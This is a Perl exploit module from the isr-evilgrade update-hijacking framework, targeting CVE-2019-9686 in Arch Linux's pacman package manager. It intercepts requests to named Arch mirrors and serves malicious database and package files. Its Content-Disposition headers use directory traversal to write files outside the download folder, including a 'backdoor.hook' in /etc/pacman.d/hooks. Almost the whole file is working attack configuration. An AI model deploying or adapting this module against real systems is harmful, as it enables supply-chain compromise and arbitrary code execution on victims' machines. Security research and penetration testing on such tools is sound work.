###############
# archlinux_pacman.pm
#
# CVE-2019-9686: Arch Linux Pacman directory traversal + signature bypass
# Allows arbitrary code execution via directory traversal in package downloads
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.

package modules::archlinux_pacman;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'Arch Linux Pacman',
    'version'     => '1.0',
    'appver'      => '< 5.1.3-1',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Exploits CVE-2019-9686: Directory traversal vulnerability in pacman package manager.
Allows injection of malicious packages via Content-Disposition header bypass.
Targets: archlinux.org, mirror.rackspace.com, mirrors.kernel.org
    },
    'vh' => '(archlinux\.org|mirror\.rackspace\.com|mirrors\.kernel\.org|archive\.archlinux\.org)',
    'request' => [
        {
            'req'   => '.*\.db\.tar\.gz',
            'type'  => 'file',
            'file'  => './include/pacman/malicious.db.tar.gz',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/gzip\r\n"
                . "Content-Disposition: attachment; filename=../../../../tmp/pwned.tar.gz\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'   => '.*\.tar\.xz',
            'type'  => 'file',
            'file'  => './include/pacman/malicious_package.tar.xz',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/x-xz\r\n"
                . "Content-Disposition: attachment; filename=../../../../etc/pacman.d/hooks/backdoor.hook\r\n"
                . "Connection: close\r\n\r\n",
        },
    ],
};

sub new {
    my $class = shift;
    my $self = $base;
    bless( $self, $class );
    return $self;
}

1;
